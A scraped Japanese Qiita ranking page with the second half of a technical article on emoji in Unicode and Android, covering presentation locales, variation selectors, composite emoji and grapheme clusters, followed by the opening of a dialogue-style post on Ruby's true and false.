<a href="https://camo.qiitausercontent.com/1c99d2b4ac182c191b04f9196e028e35716bdb9b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f63366236363961322d383332302d626136642d316335392d3865393630383539333230652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1c99d2b4ac182c191b04f9196e028e35716bdb9b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f63366236363961322d383332302d626136642d316335392d3865393630383539333230652e706e67" alt="Screenshot from 2017-11-13 21-03-42.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/c6b669a2-8320-ba6d-1c59-8e960859320e.png"></a></p>

<p>この表のたとえば１列目は「コードポイントU+231AからU+231Bまで、Emoji_Presentationの属性である。」という意味になります。この"Emoji_Presentation"という属性のついたコードポイントは、カラーで表示しなくてはなりません。</p>

<p>「Unicodeなど知らん！俺は全部カラーで表示させたい！」とか「白黒の文字こそ至高だ！カラーなど許さん！」という方がいらっしゃった場合もUnicodeはちゃんと方法を用意しています。</p>

<p><strong>Unicode:「絵文字を全部カラーにしたいと申すか。ではお主の使用している言語の設定を絵文字に切り替えるのだ！」</strong></p>

<p>「何言ってんの？」ってなったあなた、大丈夫です。私も最初「何言ってんの？」って思いました。実は絵文字用の言語(厳密には文字種ですが）ってあるんです！<br>
<a href="http://unicode.org/iso15924/iso15924-codes.html" class="autolink" rel="nofollow noopener" target="_blank">http://unicode.org/iso15924/iso15924-codes.html</a><br>
ここにあるZsym、もしくはZsyeをLanguage Tagに指定すると絵文字の表示方法が変わります。具体的にはこんな感じ。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span>        <span class="n">TextView</span> <span class="n">emojiDefault</span> <span class="o">=</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">emojiDefault</span><span class="o">);</span>
        <span class="n">emojiDefault</span><span class="o">.</span><span class="na">setTextLocale</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">forLanguageTag</span><span class="o">(</span><span class="s">"ja-Zsye-JP"</span><span class="o">));</span>

        <span class="n">TextView</span> <span class="n">textDefault</span> <span class="o">=</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">textDefault</span><span class="o">);</span>
        <span class="n">textDefault</span><span class="o">.</span><span class="na">setTextLocale</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">forLanguageTag</span><span class="o">(</span><span class="s">"ja-Zsym-JP"</span><span class="o">));</span>
</pre></div></div>

<p>表示させてみるとこんな感じ。<br>
<a href="https://camo.qiitausercontent.com/1253edeb4266290970dd734bb0bb82b605672b15/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f64333965333438662d663734362d333437322d333764382d6135643932343931663637322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1253edeb4266290970dd734bb0bb82b605672b15/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f64333965333438662d663734362d333437322d333764382d6135643932343931663637322e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/d39e348f-f746-3472-37d8-a5d92491f672.png"></a><br>
砂時計(⏳:U+231B)はカラーがデフォルト、左上矢印(↖:U+2196)は白黒がデフォルトです。</p>

<p>「いやいや、まてまて、言語設定に絵文字を使ったら、本来の言語設定に使えないじゃないか」。</p>

<p>おっしゃるとおりです。そんなあなたにおすすめなのがこちら、<em><a href="http://unicode.org/reports/tr51/#Emoji_Locale_Extension" rel="nofollow noopener" target="_blank">Emoji locale extension</a></em>です。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span>        <span class="n">TextView</span> <span class="n">defaultPresentation</span> <span class="o">=</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">defaultPresentation</span><span class="o">);</span>
        <span class="n">defaultPresentation</span><span class="o">.</span><span class="na">setTextLocale</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">forLanguageTag</span><span class="o">(</span><span class="s">"en-US-u-em-default"</span><span class="o">));</span>

        <span class="n">TextView</span> <span class="n">emojiDefault</span> <span class="o">=</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">emojiDefault</span><span class="o">);</span>
        <span class="n">emojiDefault</span><span class="o">.</span><span class="na">setTextLocale</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">forLanguageTag</span><span class="o">(</span><span class="s">"en-US-u-em-emoji"</span><span class="o">));</span>

        <span class="n">TextView</span> <span class="n">textDefault</span> <span class="o">=</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">textDefault</span><span class="o">);</span>
        <span class="n">textDefault</span><span class="o">.</span><span class="na">setTextLocale</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">forLanguageTag</span><span class="o">(</span><span class="s">"en-US-u-em-text"</span><span class="o">));</span>
</pre></div></div>

<p>表示させてみると<br>
<a href="https://camo.qiitausercontent.com/64efbc636d7a6d4524147f636c91adeef22208ee/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f65396239656432322d316562642d646432662d376432382d3262303662313934373265342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/64efbc636d7a6d4524147f636c91adeef22208ee/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f65396239656432322d316562642d646432662d376432382d3262303662313934373265342e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/e9b9ed22-1ebd-dd2f-7d28-2b06b19472e4.png"></a><br>
っとなります。。。言語ってなんだっけ・・・</p>

<p>あ、当然ですが、デバイスにフォントがなかったら、いくら設定を変えても出てこないです。念の為・・・</p>

<p>注：この機能はAndroidだとOreo(API26)から使えます。また、この機能は優先度がかなり低めに設定されているため、一部の絵文字はカラーを指定しても白黒で出てくることがあります。必ずカラーで表示させたい場合は後述の異体字セレクタを使用するのをオススメします。</p>

<h1>
<span id="絵文字用の異体字セレクタemoji-variation-selectorとは" class="fragment"></span><a href="#%E7%B5%B5%E6%96%87%E5%AD%97%E7%94%A8%E3%81%AE%E7%95%B0%E4%BD%93%E5%AD%97%E3%82%BB%E3%83%AC%E3%82%AF%E3%82%BFemoji-variation-selector%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>絵文字用の異体字セレクタ(Emoji Variation Selector)とは</h1>

<p>一個前のセクションで絵文字のカラーか白黒かについて説明したんですが、</p>

<ul>
<li>設定が「全部カラー」か「全部白黒」は極端すぎて使い勝手が悪い。個別にカラーか白黒か選べるようにしてくれ</li>
<li>カラーの絵文字と白黒の絵文字を同時に表示させたいんだが、どうすればいいんだ。</li>
</ul>

<p>って思った方もいたでしょう。<br>
そんなこともあろうかと、Unicodeはちゃんと文字単位で表示を変える方法を用意しています！それも昔からある方法で！<br>
それは日本人の方には馴染みのあるものかもしれません。「異体字セレクタ(Variation Selector)」です。</p>

<p>。。。たぶん普通の人はピンとこないですよね。<br>
あれです、「わたなべ」さんの漢字でいろいろある「邉」の字を表現するための、あれです。<br>
Unicodeは文字を定義しているので、どの「邉」も文字としては同じなので、同じコードポイントのU+9089が割り当てられました。<br>
でも「俺の"なべ"の字は、それじゃないんだけど・・・」っていう問題を解決するために、特殊な文字を後ろにつけて、形を変えられるようになってるんです。</p>

<p><a href="https://camo.qiitausercontent.com/734c87260ed63465d8477e5638fd9b9d117aea68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f64366364333339362d366662652d353235392d353666662d6232396464373861353731342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/734c87260ed63465d8477e5638fd9b9d117aea68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f64366364333339362d366662652d353235392d353666662d6232396464373861353731342e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/d6cd3396-6fbe-5259-56ff-b29dd78a5714.png"></a></p>

<p>この文字列のユニコード列は順に</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>U+6E21 U+9089 U+3055 U+3093
U+6E21 U+9089 U+E0104 U+3055 U+3093
</pre></div></div>

<p>上の例だと、U+E0104という異体字セレクタが、邉(U+9089)の直後にあります。IVSは(Ideographic Variation Selectorの略です）<br>
ちなみにこの異体字セレクタは、U+FFFFを超えているので、Javaなんかで使用する際は上で説明したようにサロゲートペアにしないといけません。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span>        <span class="n">TextView</span> <span class="n">tv</span> <span class="o">=</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">textView</span><span class="o">);</span>
        <span class="n">tv</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">"\u6E21\u9089\uDB40\uDD04\u3055\u3093"</span><span class="o">);</span>  <span class="c1">// U+E0104 = \uDB40\uDD04</span>
</pre></div></div>

<p>これと同じことが、絵文字でできるようになっています。U+FE0EとU+FE0Fの２つは、絵文字用の異体字セレクタとして登録されていて、U+FE0Eが後ろについている絵文字は白黒に、U+FE0Fが後ろについている絵文字はカラーになります。これは先程の言語設定よりも優先されます。（当然ですがフォントが存在しなければ白黒になってしまいます）</p>

<p><a href="https://camo.qiitausercontent.com/6827b50019aa9858ca5d7603b4bdc6cc4ec5b6d7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f39316664353339372d343734382d663537632d666335382d3964316338613731663636362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6827b50019aa9858ca5d7603b4bdc6cc4ec5b6d7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f39316664353339372d343734382d663537632d666335382d3964316338613731663636362e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/91fd5397-4748-f57c-fc58-9d1c8a71f666.png"></a></p>

<p>上記の文字列のユニコード列は順に</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>U+231B U+2196
U+231B U+FE0F U+2196 U+FE0F
U+231B U+FE0E U+2196 U+FE0E
</pre></div></div>

<p>となっています。</p>

<h1>
<span id="合成絵文字" class="fragment"></span><a href="#%E5%90%88%E6%88%90%E7%B5%B5%E6%96%87%E5%AD%97"><i class="fa fa-link"></i></a>合成絵文字</h1>

<p>さて、ここまでは絵文字1個あたり1コードポイントでした。まぁ後ろに異体字セレクタがついたとしても2コードポイントでした。<br>
ここからは割と「どうしてこうなった・・・」感のある合成絵文字の紹介をしていきます。これらは複数の絵文字を組み合わせることで別の絵文字になる奇抜な奴らです。</p>

<h2>
<span id="keycap" class="fragment"></span><a href="#keycap"><i class="fa fa-link"></i></a>KeyCap</h2>

<p>数字(1:U+0031 から 9:U+0039, #:U+0023)の後ろにU+20E3をつけるとボタンになります。<br>
<a href="https://camo.qiitausercontent.com/7975a5ecb9546ef02c6c40dea3ba2ff7e41d3731/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f39663631346166312d323238642d393461612d363035652d3432333663313136336435622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7975a5ecb9546ef02c6c40dea3ba2ff7e41d3731/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f39663631346166312d323238642d393461612d363035652d3432333663313136336435622e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/9f614af1-228d-94aa-605e-4236c1163d5b.png"></a></p>

<h2>
<span id="emoji-modifier" class="fragment"></span><a href="#emoji-modifier"><i class="fa fa-link"></i></a>Emoji Modifier</h2>

<p>人っぽい絵文字（例えば走ってる人:U+1F3C3)の後ろに肌色選択セレクタ(Skin Tone Selector)をつけると、肌の色が変わります。<br>
<a href="https://camo.qiitausercontent.com/b1d6ac0061c192e8f7dd3d9da60c45b2cde4d886/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f38316435366666312d393235352d326634642d616633352d3834313539346162396237642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b1d6ac0061c192e8f7dd3d9da60c45b2cde4d886/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f38316435366666312d393235352d326634642d616633352d3834313539346162396237642e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/81d56ff1-9255-2f4d-af35-841594ab9b7d.png"></a></p>

<h2>
<span id="旗" class="fragment"></span><a href="#%E6%97%97"><i class="fa fa-link"></i></a>旗</h2>

<p>U+1F1E6..U+1F1FFをアルファベットに見立て、2文字国コードを作ることで国旗になります。例えば、J + P = JPみたいな。<br>
<a href="https://camo.qiitausercontent.com/0e2343227e54cb11b913701c19f307ccc44e51b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f66623165633237312d613437612d646335612d393736372d6334623639313462393433332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0e2343227e54cb11b913701c19f307ccc44e51b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f66623165633237312d613437612d646335612d393736372d6334623639313462393433332e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/fb1ec271-a47a-dc5a-9767-c4b6914b9433.png"></a></p>

<h2>
<span id="zwjシーケンス" class="fragment"></span><a href="#zwj%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>ZWJシーケンス</h2>

<p>複数の絵文字をZWJ(Zero Width Joiner)という見えない文字で繋いで別の絵文字にしてしまう。例えば、「男の人＋ZWJ＋パレット＝男性の画家」 みたいなかんじ。<br>
<a href="https://camo.qiitausercontent.com/b8c62d5f7d16443abe0c2f94125a5b27a948f6c2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f31646130383364662d653831352d643333622d336563332d3064666231386265346437632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b8c62d5f7d16443abe0c2f94125a5b27a948f6c2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f31646130383364662d653831352d643333622d336563332d3064666231386265346437632e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/1da083df-e815-d33b-3ec3-0dfb18be4d7c.png"></a></p>

<p>ZWJシーケンスは「どんな組み合わせでもいいの？」っていう疑問が湧くと思います。<br>
答えは「ZWJの前後の文字がEmoji属性であれば、どんな組み合わせでも良い」です。当然Unicodeとして正しいシーケンスである、というだけで、実際に表示されるかどうかはフォント次第です。Microsoftの<a href="https://blog.emojipedia.org/ninja-cat-the-windows-only-emoji/" rel="nofollow noopener" target="_blank">NinjaCat</a>とかが有名ですね。</p>

<h2>
<span id="絵文字タグシーケンス" class="fragment"></span><a href="#%E7%B5%B5%E6%96%87%E5%AD%97%E3%82%BF%E3%82%B0%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>絵文字タグシーケンス</h2>

<p>旗と同じようにU+E0061..U+E007Aをアルファベットに見立て、絵文字を構成します。今のところイギリスのイングランドの旗などに使われています。<br>
旗(🏴:U+1F3F4)の後ろにgbengとつなげ、最後に終端を表す文字(U+E007F)を加えて出来上がります。gbはGreat Britain, engはEnglandを表しています。</p>

<p><a href="https://camo.qiitausercontent.com/37025e42e0c9aa42e0996f72b1b743ea1d709f93/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f30393966666332352d353962342d376335332d343162622d3862663434643630303063652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/37025e42e0c9aa42e0996f72b1b743ea1d709f93/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f30393966666332352d353962342d376335332d343162622d3862663434643630303063652e706e67" alt="1510796551.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/099ffc25-59b4-7c53-41bb-8bf44d6000ce.png"></a></p>

<p>などなど・・・</p>

<p>このように、もはや1個の絵文字は、1コードポイントではないのです。絵文字タグシーケンスに至っては7コードポイント、UTF-16なら14文字、UTF-8なら28バイトも消費して1個の絵文字を表示します。贅沢ですね〜<br>
もし部分文字列を取り出すときに、このような合成文字の途中で切ってしまうと、変な文字が残ったりするかもしれません。でもこれはSurrogate Pairみたいに、どこ切ってよいかどうかはすぐにはわかりません。そこで登場するのが次のグラフィムクラスターです。</p>

<h1>
<span id="グラフィムクラスターgrapheme-clusterとは" class="fragment"></span><a href="#%E3%82%B0%E3%83%A9%E3%83%95%E3%82%A3%E3%83%A0%E3%82%AF%E3%83%A9%E3%82%B9%E3%82%BF%E3%83%BCgrapheme-cluster%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>グラフィムクラスター(Grapheme Cluster)とは</h1>

<p>前のセクションで、もはや絵文字は1コードポイントではないと説明しました。つまり、何も考えずに部分文字列を取り出すコードを書くと、絵文字のど真ん中でブチッってやってしまう可能性があるのです。これに関連するお気に入りの面白いバグがあるので紹介します。<br>
<a href="https://camo.qiitausercontent.com/9179b383570b4324570e64866d77f0bed0bdf26f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f66396333353464612d616531312d643133632d326664662d3832396464383039343032642e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9179b383570b4324570e64866d77f0bed0bdf26f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f66396333353464612d616531312d643133632d326664662d3832396464383039343032642e676966" alt="output.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/f9c354da-ae11-d13c-2fdf-829dd809402d.gif"></a><br>
これはEditTextに、前のセクションで説明した国旗の絵文字のうち、イスラエルの国旗(IL)を大量に並べて、デリートキーを連打しているだけです。別にコピペを連打しているわけではないですし、Javaコードは一切書いていないです。なのになぜか、突然国旗がリヒテンシュタイン(LI)に変わっている、そしてまたもとに戻っている。<br>
Android M以前で発生するバグなのですが、感が鋭い方は気づいたかもしれません。そう、国旗の絵文字にはサロゲートペアと違い、ペアのうち最初に来る文字と、あとに来る文字の区別がないんです。そんな状態で最初の1コードポイントを削除してしまうと、ILの繰り返しだったものが、突然LIの繰り返し、つまりリヒテンシュタインの国旗の繰り返しになってしまったのです。</p>

<p>わかりやすく図式すると</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>コードポイント列： ILILILILILILILILILILIL
Androidはこう考える：[IL][IL][IL][IL][IL]...

先頭の1コードポイント削除

コードポイント列： LILILILILILILILILILIL
Androidはこう考える：[LI][LI][LI][LI][LI]...
</pre></div></div>

<p>これは旗の絵文字の規格の不完全さもあるとは思いますが、問題の根本はデリートキーが、間違った文字数を消しているのが原因です。じゃあ正しい文字数っていくつなの？っという疑問に対するUnicodeの答えが<a href="http://unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries" rel="nofollow noopener" target="_blank">グラフィムクラスター(Grapheme Cluster)</a>です。</p>

<p>Unicodeは、グラフィムクラスターのことをこう言っています。</p>

<blockquote>
<p>It is important to recognize that what the user thinks of as a “character”—a basic unit of a writing system for a language—may not be just a single Unicode code point. Instead, that basic unit may be made up of multiple Unicode code points. To avoid ambiguity with the computer use of the term character, this is called a user-perceived character. For example, “G” + acute-accent is a user-perceived character: users think of it as a single character, yet is actually represented by two Unicode code points. These user-perceived characters are approximated by what is called a grapheme cluster, which can be determined programmatically. <a href="http://unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries" rel="nofollow noopener" target="_blank">UAX #29</a></p>
</blockquote>

<p>ザックリいうと、ユーザーが考える「1文字」っていうのは複数のコードポイントからできてることもあるので、プログラム上の「1文字」とは別に「ユーザーの考える1文字」っていうのを定義するね。と言っています。</p>

<p>日本語にも実は例があります。ひらがなの「が」です。Unicodeではこの「が」は2通りの表記の方法があるんです。1コードポイントで表記する「が:U+304C」と、「か:U+304B」に濁点「゙:U+3099」がついた「が:U+304B U+3099」の2つです。Macが主に後者を使いますね。でも多分普段文字を書いていて、「か」と濁点の間にカーソルが置けたり、「が」をデリートキーで消そうとしたら濁点だけが残ったりすると、なんとなく「コレジャナイ感」がありますよね。これはユーザーは「が」を1文字としてみており、「か」と濁点の2文字だとは考えていないからです。</p>

<p>同じことが絵文字にも言えます。「男性+ZWJ+パレット」の組み合わせが一個の「男性の画家」の絵文字である以上、これを男性とパレットの2文字（もしくはZWJを入れて3文字）として考えるのはナンセンスです。なのでデリートキーやカーソルはこれら3つのコードポイントが一つの文字であるかのように扱います。</p>

<p>最初の旗が切り替わるバグのケースでは、グラフィムクラスターは<code>[IL][IL][IL][IL]</code>のように分解されますので、デリートキーで消すのは2コードポイントとなります。なので旗はリヒテンシュタインにはならず、イスラエルの旗が１個だけ消えるような動作をします。</p>

<p>実際にグラフィムクラスターがどう定義され、実装されているかは触れませんが、これは結局のところデータベースから文字情報を引っ張ってこないといけないので、素直にICUなどのライブラリを使うのが良いかと思います。</p>

<p>AndroidだとICU4Jが使えるので、<a href="https://developer.android.com/reference/android/icu/text/BreakIterator.html#getCharacterInstance(android.icu.util.ULocale)" rel="nofollow noopener" target="_blank">このへん</a>が良いかと思います。</p>

<h1>
<span id="バックスペースの動作" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%82%AF%E3%82%B9%E3%83%9A%E3%83%BC%E3%82%B9%E3%81%AE%E5%8B%95%E4%BD%9C"><i class="fa fa-link"></i></a>バックスペースの動作</h1>

<p>前のセクションで、デリートキーが何文字消すかについてのUnicodeの答えを説明しました。ではバックスペースはどうなのでしょう。</p>

<p>実は私の知る限りUnicodeは「よしなにやってね」以上のことを言ってない気がします。<br>
「バックスペースは、デリートキーと同じく、直前のグラフィムクラスターの切れ目まででいいんじゃね？」って思われるかもしれません。<br>
大体の場合それでOKです。ですが、バックスペースの場合は「正しくないUnicodeシーケンスのときに、正しい部分まで消してしまう」リスクがあります。</p>

<p>例えば、Key Capの絵文字の例に考えてみましょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>1 + KEYCAP(U+20E3)
</pre></div></div>

<p>これは正しいUnicodeシーケンスです。もしKEYCAPの後ろにカーソルが合って、バックスペースが押されたら、全部消して問題ないでしょう。<br>
では</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>1 + KEYCAP + KEYCAP
</pre></div></div>

<p>の場合はどうでしょう。これはUnicode的には正しくないです。そしてデバイス上では<br>
<a href="https://camo.qiitausercontent.com/8a8019a2c8c909a0e4876398ddbc570db3056b28/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f34333937636238652d303135612d383035382d336530342d3565346366366534613933342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8a8019a2c8c909a0e4876398ddbc570db3056b28/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f34333937636238652d303135612d383035382d336530342d3565346366366534613933342e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/4397cb8e-015a-8058-3e04-5e4cf6e4a934.png"></a><br>
このように表示されています。もしカーソルが最後のKEYCAPの後ろに合った場合、バックスペースが押されると、どんな結果を期待するでしょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>1 + KEYCAP
</pre></div></div>

<p>おそらく、後ろの四角だけ消えて、最初の絵文字は残っていてほしいと思うでしょう。ですがグラフィムクラスターのルールを適用すると、この2つに見える文字は一つのクラスターに属するのです。つまりバックスペースですべて消えてしまいます。<br>
この状況で最後のKEYCAPだけを消すためには、グラフィムクラスターに頼らない新たな方法が必要です。<br>
そして、おそらくそれはまだ統一的な手法は提案されていないと思います。</p>

<p>一番安全なのは、自力でバックスペースを実装しようとせず、OSに任せるのが良いとおもいます。<br>
どうしても自力で実装したいというのであれば、Androidの実装は<a href="https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/text/method/BaseKeyListener.java" rel="nofollow noopener" target="_blank">この辺</a>にあるみたいです。</p>

<h1>
<span id="さいごに" class="fragment"></span><a href="#%E3%81%95%E3%81%84%E3%81%94%E3%81%AB"><i class="fa fa-link"></i></a>さいごに</h1>

<p>ここで紹介した技術は、実は絵文字専用に開発されたものはカラー絵文字フォントくらいで、それ意外の技術は昔からあるものなのです。<br>
例えばZWJは本来はアラビア語の字形選択用、グラフィムクラスターは、これがないとハングルやタイ語で大変なことになってしまいます。<br>
サロゲートペアに限らず、絵文字を契機に、開発者のみなさんが世界中の多様な言語を表示する技術に興味を持ってくだされば幸いです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">28位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>333</kbd>
		<a target="_blank" href="https://qiita.com/rotelstift/items/70461f35c0d691e7b246">Rubyのtrueとfalseの話</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-27<br />15:38:45</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/116105.html">rotelstift</a>(8件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/116105/profile-images/1473930408">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Ruby]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>　この記事は、技術系同人誌としてまとめるはずだった原稿をほぼそのまま転載しています。諸事情により向こうかなり長い間同人誌即売会に売り手として参加することが難しくなったためです。<br>
　長いですが、お楽しみいただければ幸いです。</p>

<h1>
<span id="まえがき" class="fragment"></span><a href="#%E3%81%BE%E3%81%88%E3%81%8C%E3%81%8D"><i class="fa fa-link"></i></a>まえがき</h1>

<p>　この本は、Rubyコミッタである卜部昌平に、その妻である私、卜部一恵がRubyのtrueとfalseについて突っ込んで聞いてみた話です。本文は両者の対話形式で進んでいきます。<br>
　私は昌平と同じ大学同じ研究室に所属していたのでプログラミングについての基礎は一応ありますが、エンジニアとして職を得たことはありません。つまり、プログラミング初級者です。この本はそのくらいのレベル感の本だと思います。<br>
　私自身が初級者なりにRubyを使っていて、if文が思った通りに動かない、そんなときに抱いた疑問からこの本が生まれました。<br>
　同じような疑問を抱いている方の一助になれば幸いです。</p>

<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>K：この本は卜部昌平と卜部一恵の対話形式で構成されています。Ｓは昌平、Ｋは一恵です。よろしくお願いします。</p>

<p>S：よろしくお願いします。</p>

<p>K：今回はRubyのtrueとfalseの話ということで、私がRubyを使っていて気になったところを訊いていこうと思います。結構しつこく訊くかも。</p>

<p>S：頑張って答えます。</p>

<p>K：では、張り切って疑問その1から行きたいと思います。</p>

<h1>
<span id="trueクラスとfalseクラスそしてbooleanの話" class="fragment"></span><a href="#true%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%A8false%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%9D%E3%81%97%E3%81%A6boolean%E3%81%AE%E8%A9%B1"><i class="fa fa-link"></i></a>trueクラスとfalseクラス、そしてBooleanの話</h1>

<h2>
<span id="boolean型は存在しない" class="fragment"></span><a href="#boolean%E5%9E%8B%E3%81%AF%E5%AD%98%E5%9C%A8%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>Boolean型は存在しない</h2>

<p>K：まず、trueがtrueに、falseがfalseになる理由について訊きたいと思います。 この二つはboolean型の定数ですよね？</p>

<p>S：いえ、違います。そもそも型ってなんでしょう？</p>

<p>K：例えば、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>int n = 20        # =&gt; 型 
new Int m = 30    # =&gt; クラス
</pre></div></div>

<p> みたいな感じに思っていたのだけれど、違うのですか？</p>

<p>S：その違いがあるのは、Javaですね。でも、Rubyは両者に実は差がないんです。</p>

<p>K：え！？なんでですか？</p>

<p>S：例えば、値というものに型なりクラスなりが付いている。それとは別に、変数にも型なりクラスなりがある。この二つは区別して考えなければなりません。 <br>
